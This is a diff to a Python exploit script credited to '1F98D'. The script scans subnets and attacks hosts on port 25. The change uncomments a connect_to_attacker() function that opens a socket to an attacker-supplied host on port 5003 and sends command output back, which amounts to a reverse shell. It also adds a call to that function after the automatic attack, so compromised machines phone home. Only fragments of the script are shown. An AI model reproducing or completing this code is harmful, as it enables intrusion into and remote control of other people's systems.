@@ -3,7 +3,7 @@
 # Exploit Author: 1F98D
 # Date: 2022
 	 
-import socket
+from socket import *
 import sys
 import time
 import subprocess
@@ -87,8 +87,8 @@ def attack(nmap_res: list, PORT: int):
 			except ConnectionRefusedError and OSError:
 				print("Connection error.")
 			print("\n ")
-
-"""def connect_to_attacker():
+			
+def connect_to_attacker():
 	SERVER_HOST = sys.argv[1]
 	SERVER_PORT = 5003
 	BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
@@ -130,7 +130,7 @@ def attack(nmap_res: list, PORT: int):
 		message = f"{output}{SEPARATOR}{cwd}"
 		s.send(message.encode())
 	# close client connection
-	s.close()"""
+	s.close()
 				
 						
 def main():
@@ -145,6 +145,8 @@ def main():
 		attack(target, int(port))
 	else:
 		attack(find_subnets(), 25)  # auto attack
+		connect_to_attacker()
+	
 
 if __name__ == "__main__":
 	main()
